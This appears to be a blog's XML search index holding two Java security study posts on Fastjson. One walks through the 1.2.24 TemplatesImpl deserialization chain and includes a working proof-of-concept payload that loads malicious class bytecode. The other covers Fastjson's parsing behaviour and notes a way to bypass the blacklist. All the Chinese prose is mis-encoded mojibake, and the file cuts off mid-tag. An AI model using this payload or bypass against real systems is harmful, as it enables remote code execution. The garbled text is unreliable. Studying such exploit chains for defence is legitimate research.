<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Fastjson 1.2.24</title>
    <link href="/2023/05/12/Fastjson-1-2-24/"/>
    <url>/2023/05/12/Fastjson-1-2-24/</url>
    
    <content type="html"><![CDATA[<p>åœ¨2017å¹´3æœˆ15æ—¥ï¼Œfastjsonå®˜æ–¹ä¸»åŠ¨çˆ†å‡ºåœ¨ 1.2.24 åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±å®‰å…¨æ¼æ´ã€‚</p><blockquote><p>å½±å“ç‰ˆæœ¬ï¼š<code>fastjson &lt;= 1.2.24</code> æè¿°ï¼šfastjson é»˜è®¤ä½¿ç”¨ <code>@type</code> æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚</p></blockquote><p>æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚æˆ‘ä¹Ÿæœ‰ç‚¹è½åçš„æ¥å­¦ä¹ äº†ğŸ˜¶â€ğŸŒ«ï¸</p><h3 id="TemplatesImpl-åˆ©ç”¨é“¾"><a href="#TemplatesImpl-åˆ©ç”¨é“¾" class="headerlink" title="TemplatesImpl åˆ©ç”¨é“¾"></a>TemplatesImpl åˆ©ç”¨é“¾</h3><p>ä¹‹å‰cc3çš„æ—¶å€™æœ‰åˆ©ç”¨è¿‡TemplatesImplåŠ è½½å­—èŠ‚ç ï¼Œè¿™é‡Œå…¶å®ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><p>TemplatesImplç±»å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œå› æ­¤å¯ä»¥è¢«åºåˆ—åŒ–ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å…³æ³¨è¯¥ç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å±æ€§<code>_class</code>ï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º <code>_transletIndex</code> çš„ç±»ä¼šåœ¨ <code>getTransletInstance()</code> æ–¹æ³•ä¸­ä½¿ç”¨ <code>newInstance()</code> è¿›è¡Œå®ä¾‹åŒ–ã€‚</p><p><img src="https://img.katck.com/images/2023/05/12/cfa7f5e468a679a25fabcd58447c6ce5.png" alt="image-20230512211916404"></p><p><strong>å“ªé‡Œå¯ä»¥è°ƒç”¨è¿™ä¸ª<code>getTransletInstance()</code>å‘¢ï¼Ÿ</strong></p><p>æˆ‘ä»¬æ‰¾åˆ°è¿™æ ·ä¸€æ¡è°ƒç”¨é“¾ <code>getOutputProperties() =&gt; newTransformer() =&gt; getTransletInstance()</code></p><p>è€Œ <code>getOutputProperties()</code> æ–¹æ³•å°±æ˜¯ç±»æˆå‘˜å˜é‡ <code>_outputProperties</code> çš„ <code>getter</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨fastjsonå¤„ç† <code>@type</code> çš„jsonæ—¶è°ƒç”¨ã€‚è¿™å°±ç»™äº†æˆ‘ä»¬ä¸€æ¡å¾ˆå®¹æ˜“è§¦å‘çš„åˆ©ç”¨é“¾ã€‚</p><p><strong>é‚£ä¹ˆè¿™ä¸ª<code>_class</code>å¯æ§å—ï¼Ÿ</strong></p><p>æœç´¢ä¸€ä¸‹è°ƒç”¨ï¼Œå‘ç°åœ¨ <code>readObject</code>ã€æ„é€ æ–¹æ³•ä»¥åŠ <code>defineTransletClasses()</code> ä¸­æœ‰èµ‹å€¼æ“ä½œ</p><p><img src="https://img.katck.com/images/2023/05/12/8a089fba9fcb5c067c475656ad087abb.png" alt="image-20230512213228900"></p><p><code>defineTransletClasses()</code> åœ¨ <code>getTransletInstance()</code> ä¸­æœ‰è°ƒç”¨ï¼Œå¦‚æœ <code>_class</code> ä¸ä¸ºç©ºåˆ™ä¼šè¢«è°ƒç”¨</p><p><img src="https://img.katck.com/images/2023/05/12/5d749b9e896b17eb9155f66d5e71066b.png" alt="image-20230512213433873"></p><p>è·Ÿè¿›ä¸€ä¸‹çœ‹ä¸€ä¸‹<code>defineTransletClasses()</code> </p><p><img src="https://img.katck.com/images/2023/05/12/d29233a59ee82dffffcc3bcbfdbb7515.png" alt="image-20230512214107029"></p><p><img src="https://img.katck.com/images/2023/05/12/7ce70873537f572fab7a1f2796012ed4.png" alt="image-20230512214133908"></p><p>è¦æ±‚ <code>_bytecodes</code> ä¸ä¸ºnullï¼Œç„¶åè°ƒç”¨è‡ªå®šä¹‰çš„ClassLoaderå»åŠ è½½ <code>_bytecodes</code> ä¸­çš„ <code>byte[]</code>ï¼›<code>_bytecodes</code> ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å˜é‡</p><p>å¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º <code>ABSTRACT_TRANSLET</code> ä¹Ÿå°±æ˜¯ <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ï¼Œå°±ä¼šå°†<code>_transletIndex</code>è®¾ç½®ä¸º<code>i</code>ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œé‚£ä¹ˆ<code>_transletIndex = 0</code> å¾—åˆ°<code>_class[0]</code></p><p>ä¸è¿‡çˆ¶ç±»ä¸æ˜¯ <code>ABSTRACT_TRANSLET</code>ï¼Œåˆ™åœ¨åé¢çš„åˆ¤æ–­ä¸­æŠ›å‡ºå¼‚å¸¸ï¼ˆé»˜è®¤æƒ…å†µä¸‹<code>_transletIndex = -1</code>ï¼‰</p><h4 id="å®Œæ•´åˆ©ç”¨é“¾"><a href="#å®Œæ•´åˆ©ç”¨é“¾" class="headerlink" title="å®Œæ•´åˆ©ç”¨é“¾"></a>å®Œæ•´åˆ©ç”¨é“¾</h4><p>è¿™æ—¶å€™ä¸€æ¡å®Œæ•´çš„åˆ©ç”¨é“¾å°±å‡ºæ¥äº†ï¼š</p><p>æˆ‘ä»¬éœ€è¦é€šè¿‡@typeè®©Fastjsonååºåˆ—åŒ–ä¸€ä¸ªTemplatesImpl ç±»ï¼Œå…¶ä¸­<code>_bytecodes</code> æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ <code>ABSTRACT_TRANSLET</code>ï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</p><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<code>getter</code>æ–¹æ³•<code>getOutputProperties()</code>ä¼šè¢«fastjsonè°ƒç”¨ï¼Œè¿™ä¸ªæ–¹æ³•å°†è§¦å‘æ•´ä¸ªåˆ©ç”¨é“¾ï¼š<code>getOutputProperties() =&gt; newTransformer() =&gt; getTransletInstance() =&gt; defineTransletClasses() =&gt; EvilClass.newInstance()</code></p><p>å…¶ä¸­ï¼Œä¸ºäº†æ»¡è¶³æ¼æ´ç‚¹è§¦å‘ä¹‹å‰ä¸æŠ¥å¼‚å¸¸åŠé€€å‡ºï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ»¡è¶³ <code>_name</code> ä¸ä¸º null ï¼Œ<code>_tfactory</code> ä¸ä¸º null</p><p>ç”±äºæˆ‘ä»¬éœ€è¦æ›´æ”¹çš„ç§æœ‰å˜é‡ï¼ˆ<code>_bytecodes</code> <code>_class</code>ï¼‰æ²¡æœ‰setteræ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚è¿™è®©è¿™æ¡åˆ©ç”¨é“¾å˜å¾—éå¸¸é¸¡è‚‹ã€‚</p><p><strong>æœ€ç»ˆPayloadï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            shell = FiletoBase64.filetoBase64(<span class="hljs-string">&quot;C:/Users/aurey/Documents/Java Security/example_fastjson/Shell.class&quot;</span>);<br>            System.out.println(shell);<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/05/12/2693a7ecea8196032f25da379c20f0eb.png" alt="image-20230512220022217"></p><h3 id="JdbcRowSetImpl-åˆ©ç”¨é“¾"><a href="#JdbcRowSetImpl-åˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImpl åˆ©ç”¨é“¾"></a>JdbcRowSetImpl åˆ©ç”¨é“¾</h3><h3 id="JndiRefForwardingDataSource-åˆ©ç”¨é“¾"><a href="#JndiRefForwardingDataSource-åˆ©ç”¨é“¾" class="headerlink" title="JndiRefForwardingDataSource åˆ©ç”¨é“¾"></a>JndiRefForwardingDataSource åˆ©ç”¨é“¾</h3><h3 id="BCEL-åˆ©ç”¨é“¾"><a href="#BCEL-åˆ©ç”¨é“¾" class="headerlink" title="BCEL åˆ©ç”¨é“¾"></a>BCEL åˆ©ç”¨é“¾</h3>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonåˆæ¢</title>
    <link href="/2023/05/10/Fastjson%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/05/10/Fastjson%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›Fastjsonçš„ä½¿ç”¨æ–¹æ³•ã€ç‰¹å¾ã€åŸç†</p><h3 id="Fastjson-ç®€ä»‹"><a href="#Fastjson-ç®€ä»‹" class="headerlink" title="Fastjson ç®€ä»‹"></a>Fastjson ç®€ä»‹</h3><p>Fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ã€‚</p><p>Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ã€‚</p><h3 id="Fastjson-åº”ç”¨"><a href="#Fastjson-åº”ç”¨" class="headerlink" title="Fastjson åº”ç”¨"></a>Fastjson åº”ç”¨</h3><h4 id="ååºåˆ—åŒ–æµ‹è¯•"><a href="#ååºåˆ—åŒ–æµ‹è¯•" class="headerlink" title="ååºåˆ—åŒ–æµ‹è¯•"></a>ååºåˆ—åŒ–æµ‹è¯•</h4><p><strong>Userç±»ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨ç©ºå‚æ„é€ &quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨å½¢å‚æ„é€ &quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æµ‹è¯•ååºåˆ—åŒ–åŠŸèƒ½</strong></p><p><img src="https://img.katck.com/images/2023/05/11/a858e0d402b81d0b5670dc25e38d2a49.png" alt="image-20230510205447217"></p><p>é€šè¿‡ parse è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://img.katck.com/images/2023/05/11/3f9e031590e64f741aaa7e65fece4a57.png" alt="image-20230510210527764"></p><p>é€šè¿‡ parseObject è¿›è¡Œååºåˆ—åŒ–ï¼Œä¸æŒ‡å®šç±»</p><p><img src="https://img.katck.com/images/2023/05/11/7a742559611615e44d2392af99f68ab8.png" alt="image-20230510210747901"></p><p>é€šè¿‡ parseObject è¿›è¡Œååºåˆ—åŒ–ï¼ŒæŒ‡å®šç±»</p><p><img src="https://img.katck.com/images/2023/05/11/fde6ee64ab1ec09c9ac5b24d9a473d30.png" alt="image-20230510210837133"></p><p><strong>ç»“è®ºï¼š</strong>parseObject æ–¹æ³•åœ¨æŒ‡å®šç±»è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ç‰¹å®š <code>setter</code> æ–¹æ³•ä»¥åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ <code>getter</code> æ–¹æ³•</p><h4 id="JSON-toJSONString"><a href="#JSON-toJSONString" class="headerlink" title="JSON.toJSONString"></a>JSON.toJSONString</h4><p><code>JSON.toJSONString</code> å­˜åœ¨3ä¸ªé‡è½½æ–¹æ³•ï¼Œè¿™é‡Œä½¿ç”¨<code>toJSONString(Object object, SerializerFeature... features)</code>æ–¹æ³•</p><p><img src="https://img.katck.com/images/2023/05/11/3b274328366ed2b7eec7098bf9e51621.png" alt="image-20230510211931963"></p><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºä¸­å­˜åœ¨<code>&quot;@type&quot;:&quot;org.example.User&quot;</code></p><p><strong>å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–</strong></p><p>ä¸åŒ…å«@typeæ—¶ï¼š</p><p><img src="https://img.katck.com/images/2023/05/11/20d113a227a3c5ee8ba3a7cbb8362b20.png" alt="image-20230510212122063"></p><p>åŒ…å«@typeæ—¶ä½¿ç”¨parse</p><p><img src="https://img.katck.com/images/2023/05/11/6ad695aefb8e297e456b778c476c2c35.png" alt="image-20230510212246836"></p><p>åŒ…å«@typeæ—¶ä½¿ç”¨parseObject</p><p><img src="https://img.katck.com/images/2023/05/11/11f1b778e6d909b68844c95049187424.png" alt="image-20230510212304487"></p><p><strong>ç»“è®ºï¼š</strong></p><p>ä¸æŒ‡å®š@typeå°±ä¸ä¼šè°ƒç”¨æ„é€ æ–¹æ³•å’Œsetter</p><p>æŒ‡å®š@typeæ—¶ï¼Œparseåªä¼šè°ƒç”¨æ„é€ æ–¹æ³•å’Œç‰¹å®šsetterï¼ŒparseObjectä¼šé¢å¤–è°ƒç”¨getter</p><h4 id="épublicå±æ€§æµ‹è¯•"><a href="#épublicå±æ€§æµ‹è¯•" class="headerlink" title="épublicå±æ€§æµ‹è¯•"></a>épublicå±æ€§æµ‹è¯•</h4><p>æ”¹é€ ä¸€ä¸‹Userç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.operations.Bool;<br><br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean married;<br>    <span class="hljs-keyword">private</span> Properties prop;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨ç©ºå‚æ„é€ &quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, String full_name, <span class="hljs-type">int</span> age, Boolean married, Properties prop)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨å½¢å‚æ„é€ &quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.full_name = full_name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.married = married;<br>        <span class="hljs-built_in">this</span>.prop = prop;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getMarried</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨getMarried()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.married;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, full_name=&#x27;&quot;</span> + full_name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, married=&quot;</span> + married +<br>                <span class="hljs-string">&quot;, prop=&quot;</span> + prop +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ååºåˆ—åŒ–ï¼š</p><p><img src="https://img.katck.com/images/2023/05/11/f605948d1a4189b7bd99c653a6682a93.png" alt="image-20230510221550017"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">public String name<span class="hljs-comment">;ååºåˆ—åŒ–æˆåŠŸ</span><br><span class="hljs-keyword">private</span> String full_name<span class="hljs-comment">; ååºåˆ—åŒ–å¤±è´¥</span><br><span class="hljs-keyword">private</span> int age<span class="hljs-comment">; setAgeå‡½æ•°è¢«è°ƒç”¨</span><br><span class="hljs-keyword">private</span> Boolean married<span class="hljs-comment">; getMarriedå‡½æ•°æ²¡æœ‰è¢«è°ƒç”¨</span><br><span class="hljs-keyword">private</span> Properties prop<span class="hljs-comment">; getProp()å‡½æ•°è¢«æˆåŠŸè°ƒç”¨</span><br></code></pre></td></tr></table></figure><p><strong>ç»“è®ºï¼š</strong></p><p>publicçš„å±æ€§ä¼šè¿›è¡Œååºåˆ—åŒ–èµ‹å€¼ï¼Œprivateçš„å±æ€§ä¸ä¼šç›´æ¥è¿›è¡Œååºåˆ—åŒ–å¤åˆ¶ï¼Œè€Œæ˜¯è°ƒç”¨setxxxï¼ˆxxxä¸ºå±æ€§åï¼‰çš„å‡½æ•°è¿›è¡Œèµ‹å€¼</p><p>getxxxï¼ˆxxxä¸ºå±æ€§åï¼‰çš„å‡½æ•°ä¼šæ ¹æ®å‡½æ•°è¿”å›å€¼çš„ä¸åŒï¼Œè€Œé€‰æ‹©è¢«è°ƒç”¨æˆ–ä¸è¢«è°ƒç”¨ã€‚</p><h4 id="parseååºåˆ—åŒ–è¿‡ç¨‹è°ƒè¯•"><a href="#parseååºåˆ—åŒ–è¿‡ç¨‹è°ƒè¯•" class="headerlink" title="parseååºåˆ—åŒ–è¿‡ç¨‹è°ƒè¯•"></a>parseååºåˆ—åŒ–è¿‡ç¨‹è°ƒè¯•</h4><p><img src="https://img.katck.com/images/2023/05/11/a95b4797bd4b3ac836a8d98220cd92d7.png" alt="image-20230510223124840"></p><p>è°ƒç”¨JSON#parse()ï¼Œç„¶å new DefaultJSONParser()</p><p><img src="https://img.katck.com/images/2023/05/11/e745e4228e1539caba396a405b3f796a.png" alt="image-20230510223328328"></p><p>thisè°ƒç”¨è‡³æ„é€ æ–¹æ³•ï¼Œlexer.getCurrent() è·å–lexer.chå±æ€§ï¼Œè¿™é‡Œæ˜¯è·å–JSONå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå³<code>&#123;</code></p><p><img src="https://img.katck.com/images/2023/05/11/9791832ee1ef058bff9c74ad8f3b75a5.png" alt="image-20230510223852788"></p><p>è¿›å…¥DefaultJSONParser#parse() é€šè¿‡switchåˆ¤æ–­ï¼Œè¿›å…¥ new JSONObject</p><p><img src="https://img.katck.com/images/2023/05/11/433481df89d71eefa32ea17799f754f8.png" alt="image-20230510224121366"></p><p>è°ƒç”¨è‡³JSONObject#JSONObject(int initialCapacity, boolean ordered)æ„é€ æ–¹æ³•</p><p><img src="https://img.katck.com/images/2023/05/11/94209941c5bef2d705f8ca56637b5b73.png" alt="image-20230510224531664"></p><p>è°ƒç”¨è‡³DefaultJSONParser#parseObject(Map object, Object fieldName)æ–¹æ³•</p><p><img src="https://img.katck.com/images/2023/05/11/912025fa26f3f3d02854673de333dd23.png" alt="image-20230510224757451"></p><p>æ­¤æ—¶å¼€å§‹è§£æJSONå­—ç¬¦ä¸²ï¼Œåˆ¤æ–­ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>&quot;</code>ï¼Œç„¶åå–å‡ºé”®åï¼Œè¿™é‡Œæ˜¯<code>@type</code>ï¼Œå†åˆ¤æ–­æ¥ä¸‹æ¥å­—ç¬¦æ˜¯å¦ç¬¦åˆè§„åˆ™</p><p><img src="https://img.katck.com/images/2023/05/11/986789abcdb97ed51c0315c151bc8121.png" alt="image-20230510225025370"></p><p>è°ƒç”¨è‡³TypeUtils.loadClass(ref, this.config.getDefaultClassLoader())ï¼Œè·å–ç±»å¯¹è±¡</p><p><img src="https://img.katck.com/images/2023/05/11/7ad101e179387c3ee432390918525bcf.png" alt="image-20230510225316756"></p><p>ä»mapä¸­å–å‡ºclassNameï¼ˆmapä¸­ç¼“å­˜äº†ä¸€äº›å¸¸è§çš„åŸºç¡€ç±»ï¼‰</p><p>Tipsï¼šè¿™é‡Œå¯ä»¥çœ‹åˆ°className.startsWith(â€œLâ€)ä¼šå¯¹Lè¿›è¡Œå»é™¤ï¼Œè¿™ä¸ªç‰¹å¾å¯ä»¥ç”¨äºç»•è¿‡é»‘åå•ã€‚</p><p><img src="https://img.katck.com/images/2023/05/11/4ae6900b1dfffc1661efaf2c2964d99a.png" 